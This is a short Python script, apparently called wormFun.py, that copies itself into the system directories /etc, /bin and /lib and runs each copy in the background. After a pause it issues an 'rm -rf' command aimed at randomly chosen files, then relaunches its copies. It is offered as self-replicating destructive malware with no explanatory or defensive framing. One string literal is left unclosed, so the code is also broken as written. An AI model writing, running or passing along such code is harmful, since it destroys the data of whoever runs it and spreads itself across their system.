import os
from time import sleep
cp = 'cp wormFun.py /etc'
os.system(cp)
cp = 'cp wormFun.py /bin'
os.system(cp)
cp = 'cp wormFun.py /lib'
os.system(cp)
run = 'python3 /etc/wormFun.py &'
os.system(run)
run = 'python3  /bin/wormFun.py &'
os.system(run)
run = 'python3 /lib/wormFun.py &
os.system(run)
sleep(20)
dele = 'ls | shuf -n 3 | rm -rf'
os.system(dele)
run = 'python3 /etc/wormFun.py &'
os.system(run)
run = 'python3  /bin/wormFun.py &'
os.system(run)
run = 'python3 /lib/wormFun.py &'
os.system(run)
